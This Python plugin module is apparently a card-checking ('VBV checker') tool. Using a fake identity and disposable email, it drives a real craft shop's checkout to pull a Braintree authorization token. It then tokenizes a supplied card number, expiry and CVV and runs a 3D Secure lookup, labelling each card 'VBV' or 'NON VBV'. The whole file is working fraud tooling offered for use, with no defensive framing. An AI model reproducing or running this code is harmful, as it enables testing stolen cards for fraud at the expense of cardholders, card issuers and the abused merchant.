import base64
import json
import uuid
import requests
from mills.plugins._helpers.tools import find_between
from mills.classes.rand_user import RandUser



def vbv_one(r, rand_user):
    
    xreq_head = {'x-requested-with': 'XMLHttpRequest'}

    a = r.get('https://buddlycrafts.com/shop/product-1697/collall-3d-silicone-glue-syringe-5ml/')
    if not a:
        return
    b_data = {
    'id': '1697',
    'action': 'add',
    'qty': '1',
    }

    b = r.post('https://buddlycrafts.com/basket/', b_data, headers = xreq_head)
    if not b: return
    c = r.post('https://buddlycrafts.com/checkout/step1/',{'email':'vqpfxiwzsl@knowledgemd.com'})
    if not c:return

    d_data = {
    'country': 'US',
    'name': rand_user['name'],
    'line1': rand_user['street'],
    'line2': '',
    'town_or_city': rand_user['city'],
    'us_state': rand_user['state'],
    'county_or_state': rand_user['state'],
    'postal_code': rand_user['zip'],
    'phone': rand_user['phone'],
    }


    d = r.post(c.url, d_data)

    e = r.post(d.url, {'payment_method': 'braintree'})
    client = find_between(e.text, '"client_token": "', '"')
    if not client: return
    first = base64.b64decode(client)
    auth = json.loads(first)['authorizationFingerprint']
    return auth


    





def vbv_two(r, rand_user, auth,cc, mes,ano, cvv):
    
    e_data = {
    "clientSdkMetadata": {
        "source": "client",
        "integration": "custom",
        "sessionId": str(uuid.uuid4())
    },
    "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
    "variables": {
        "input": {
            "creditCard": {
                "number": cc,
                "expirationMonth":mes,
                "expirationYear": ano,
                "cvv": cvv,
                "cardholderName": rand_user['name']
            },
            "options": {
                "validate": False
            }
        }
    },
    "operationName": "TokenizeCreditCard"
}


    e_header = {
    'Authorization': 'Bearer '+ auth,
    'Braintree-Version': '2018-05-10',
    }

    e = r.post('https://payments.braintree-api.com/graphql', json = e_data, headers = e_header)
    if e.status_code != 200: return
    token = e.json()['data']['tokenizeCreditCard']['token']


    f_data ={
    "amount": "6.65",
    "additionalInfo": {
        "shippingGivenName": rand_user['first_name'],
        "shippingSurname": rand_user['last_name'],
        "shippingPhone": rand_user['phone'],
        "billingLine1": rand_user['street'],
        "billingLine2": "",
        "billingCity": rand_user['city'],
        "billingState": rand_user['state'],
        "billingPostalCode": rand_user['zip'],
        "billingCountryCode": "US",
        "billingPhoneNumber": rand_user['phone'],
        "billingGivenName": rand_user['first_name'],
        "billingSurname": rand_user['last_name'],
        "shippingLine1": rand_user['street'],
        "shippingLine2": "",
        "shippingCity": rand_user['city'],
        "shippingState": rand_user['state'],
        "shippingPostalCode": rand_user['zip'],
        "shippingCountryCode": "US",
        "email": rand_user['email']
    },
    "challengeRequested": True,
    "bin": "530589",
    "dfReferenceId": "0_e7f6e781-3f95-4436-a487-329761a4df0c",
    "clientMetadata": {
        "requestedThreeDSecureVersion": "2",
        "sdkVersion": "web/3.68.0",
        "cardinalDeviceDataCollectionTimeElapsed": 8172,
        "issuerDeviceDataCollectionTimeElapsed": 13225,
        "issuerDeviceDataCollectionResult": False
    },
    "authorizationFingerprint": auth,
    "braintreeLibraryVersion": "braintree/web/3.68.0",
    "_meta": {
        "merchantAppId": "buddlycrafts.com",
        "platform": "web",
        "sdkVersion": "3.68.0",
        "source": "client",
        "integration": "custom",
        "integrationType": "custom",
        "sessionId": str(uuid.uuid4())
    }
}


    f = r.post(f'https://api.braintreegateway.com/merchants/wpb9ny3nhgd6qvqh/client_api/v1/payment_methods/{token}/three_d_secure/lookup', json = f_data)
    x = f.json()['paymentMethod']['threeDSecureInfo']
    status = x['status']
    enrolled = x['enrolled']
    if enrolled == 'Y':
        return status + '-'+ enrolled, "❌", 'VBV'
    else:
        return status + '-'+ enrolled, "✅", 'NON VBV'